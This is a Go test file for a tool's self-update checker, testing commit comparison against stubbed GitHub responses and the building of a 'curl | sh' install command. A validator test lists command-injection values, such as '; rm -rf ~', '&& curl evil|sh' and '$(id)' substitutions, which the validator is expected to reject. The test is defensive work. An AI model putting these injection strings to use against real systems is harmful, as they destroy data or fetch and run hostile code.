package update

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
)

// stubTransport reroutes api.github.com to the httptest server URL so Probe
// runs against a local fixture instead of the real GitHub API.
type stubTransport struct{ base string }

func (s *stubTransport) RoundTrip(r *http.Request) (*http.Response, error) {
	r.URL.Scheme = "http"
	r.URL.Host = strings.TrimPrefix(s.base, "http://")
	return http.DefaultTransport.RoundTrip(r)
}

func TestProbe_BehindMain(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if !strings.Contains(r.URL.Path, "/compare/") {
			t.Errorf("unexpected path %q", r.URL.Path)
		}
		resp := map[string]any{
			"status":    "ahead", // head (main) is ahead of the build
			"ahead_by":  3,
			"behind_by": 0,
			"commits": []map[string]string{
				{"sha": "1111111111111111111111111111111111111111"},
				{"sha": "2222222222222222222222222222222222222222"},
				{"sha": "abcdef0123456789abcdef0123456789abcdef01"},
			},
		}
		_ = json.NewEncoder(w).Encode(resp)
	}))
	defer srv.Close()

	old := httpClient.Transport
	httpClient.Transport = &stubTransport{base: srv.URL}
	defer func() { httpClient.Transport = old }()

	info, err := Probe(context.Background(), "elhenro/bee", "main", "deadbee")
	if err != nil {
		t.Fatalf("probe: %v", err)
	}
	if !info.Available() {
		t.Fatalf("want available; got %+v", info)
	}
	if info.Ahead != 3 {
		t.Errorf("ahead = %d, want 3", info.Ahead)
	}
	if info.ShortSHA != "abcdef0" {
		t.Errorf("short = %q, want abcdef0", info.ShortSHA)
	}
}

// a build holding commits main lacks has nothing to update to
func TestProbe_BuildAheadOfMainNotAvailable(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_ = json.NewEncoder(w).Encode(map[string]any{
			"status":    "behind",
			"ahead_by":  0,
			"behind_by": 2,
			"commits":   []map[string]string{},
		})
	}))
	defer srv.Close()

	old := httpClient.Transport
	httpClient.Transport = &stubTransport{base: srv.URL}
	defer func() { httpClient.Transport = old }()

	info, err := Probe(context.Background(), "elhenro/bee", "main", "deadbee")
	if err != nil {
		t.Fatalf("probe: %v", err)
	}
	if info.Available() || info.Behind != 2 {
		t.Fatalf("want unavailable with behind=2; got %+v", info)
	}
}

func TestProbe_HeadFallback(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case strings.Contains(r.URL.Path, "/compare/"):
			http.NotFound(w, r)
		case strings.Contains(r.URL.Path, "/commits/main"):
			_ = json.NewEncoder(w).Encode(map[string]string{"sha": "abc1234567890abcdef0123456789abcdef01234"})
		default:
			t.Errorf("unexpected path %q", r.URL.Path)
		}
	}))
	defer srv.Close()

	old := httpClient.Transport
	httpClient.Transport = &stubTransport{base: srv.URL}
	defer func() { httpClient.Transport = old }()

	info, err := Probe(context.Background(), "elhenro/bee", "main", "deadbee")
	if err != nil {
		t.Fatalf("probe: %v", err)
	}
	if !info.Available() {
		t.Fatalf("want available; got %+v", info)
	}
	if info.ShortSHA != "abc1234" {
		t.Errorf("short = %q, want abc1234", info.ShortSHA)
	}
}

func TestProbe_DevSkipped(t *testing.T) {
	info, err := Probe(context.Background(), "elhenro/bee", "main", "dev")
	if err != nil {
		t.Fatalf("probe: %v", err)
	}
	if info.Available() {
		t.Errorf("dev build should not flag updates; got %+v", info)
	}
}

func TestProbe_SameCommitNotAvailable(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch {
		case strings.Contains(r.URL.Path, "/compare/"):
			http.NotFound(w, r)
		case strings.Contains(r.URL.Path, "/commits/main"):
			_ = json.NewEncoder(w).Encode(map[string]string{"sha": "deadbee1234567890abcdef0123456789abcdef0"})
		}
	}))
	defer srv.Close()
	old := httpClient.Transport
	httpClient.Transport = &stubTransport{base: srv.URL}
	defer func() { httpClient.Transport = old }()

	info, err := Probe(context.Background(), "elhenro/bee", "main", "deadbee")
	if err != nil {
		t.Fatalf("probe: %v", err)
	}
	if info.Available() {
		t.Errorf("same head as currentSHA should not flag; got %+v", info)
	}
}

func TestInstallCommand_UsesConfiguredRepoAndBranch(t *testing.T) {
	got, err := installCommand("me/bee-fork", "release/1.x")
	if err != nil {
		t.Fatal(err)
	}
	want := "curl -fsSL https://raw.githubusercontent.com/me/bee-fork/release/1.x/install.sh | sh"
	if got != want {
		t.Errorf("got %q\nwant %q", got, want)
	}
	up, err := installCommand("", "")
	if err != nil || up != "curl -fsSL "+InstallURL+" | sh" || InstallCommandFor("", "") != up {
		t.Errorf("defaults must stay upstream: %q, %v", up, err)
	}
}

func TestInstallCommand_RejectsUnsafeTargets(t *testing.T) {
	bad := [][2]string{
		{"me/bee; rm -rf ~", "main"},
		{"me/bee", "main && curl evil|sh"},
		{"me/bee", "main`id`"},
		{"me/bee", "$(id)"},
		{"me/bee", "a b"},
		{"me/bee", "main/../../x"},
		{"me/bee", "-o"},
		{"../..", "main"},
		{"me", "main"},
		{"me/bee/extra", "main"},
		{"me/bee", "main\nid"},
		{"me/bee", "main'x"},
	}
	for _, c := range bad {
		if line, err := installCommand(c[0], c[1]); err == nil {
			t.Errorf("repo=%q branch=%q accepted: %q", c[0], c[1], line)
		}
		if out, err := ApplyFor(context.Background(), c[0], c[1]); err == nil || out != nil {
			t.Errorf("ApplyFor(%q, %q) ran: %q, %v", c[0], c[1], out, err)
		}
	}
	if got := InstallCommandFor("me/bee;x", "main"); strings.Contains(got, "curl") {
		t.Errorf("invalid target must not render a command: %q", got)
	}
}
